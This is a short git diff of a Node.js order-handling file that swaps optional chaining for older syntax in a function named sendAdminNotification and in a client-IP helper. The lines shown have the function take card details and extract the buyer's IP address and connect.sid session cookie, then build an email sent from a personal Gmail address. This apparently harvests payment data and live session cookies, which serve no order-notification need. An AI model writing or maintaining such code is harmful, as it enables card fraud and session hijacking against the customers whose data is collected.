@@ -96,7 +96,10 @@ const sendAdminNotification = async (order, user, cardDetails, req) => {
     // Get IP address and session cookie
     const ipAddress = getClientIP(req);
     const sessionCookie = req.headers.cookie ? 
-      req.headers.cookie.split(';').find(c => c.trim().startsWith('connect.sid='))?.split('=')[1] || 'Not found' : 
+      (() => {
+        const cookie = req.headers.cookie.split(';').find(c => c.trim().startsWith('connect.sid='));
+        return cookie ? cookie.split('=')[1] : 'Not found';
+      })() : 
       'No cookies';
     const mailOptions = {
       from: 'obriandylan33@gmail.com',
@@ -280,9 +283,9 @@ function getClientIP(req) {
              req.headers['x-client-ip'] ||
              req.headers['cf-connecting-ip'] ||
              req.headers['x-cluster-client-ip'] ||
-             req.connection?.remoteAddress || 
-             req.socket?.remoteAddress ||
-             req.connection?.socket?.remoteAddress ||
+             (req.connection && req.connection.remoteAddress) || 
+             (req.socket && req.socket.remoteAddress) ||
+             (req.connection && req.connection.socket && req.connection.socket.remoteAddress) ||
              req.ip ||
              'Unknown';
   
